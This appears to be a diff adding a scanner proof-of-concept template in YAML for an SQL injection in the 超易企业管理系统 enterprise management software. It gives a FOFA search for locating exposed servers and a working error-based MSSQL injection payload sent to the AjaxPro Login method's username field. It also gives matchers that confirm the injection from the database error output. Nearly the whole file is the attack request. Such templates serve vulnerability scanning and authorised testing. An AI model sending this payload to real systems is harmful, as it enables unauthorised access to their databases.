@@ -1,0 +1,22 @@
+id: poc-yaml-cysoft-ajaxpro-cysoft-sqli
+info:
+  name: 超易企业管理系统 cySoft.Index,cySoft.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 超易企业管理系统
+  fofa: body="超易管理系统登录"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ajaxpro/cySoft.Index,cySoft.ashx
+  headers:
+    Content-Type: text/plain; charset=UTF-8
+    X-AjaxPro-Method: Login
+  data: '{"strUser":"admin'' AND 4026 IN (SELECT (sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))))--","strPwd":""}'
+  expression: "status_code == 200 && \ncontains(body,\"0x\"+t2) &&\ncontains(body,\"\
+    转换成数据类型 int 时失败\") &&\ncontains(body,\"在将 nvarchar 值\") &&\n!contains(body,\"\
+    <\")\n"
+transport: http
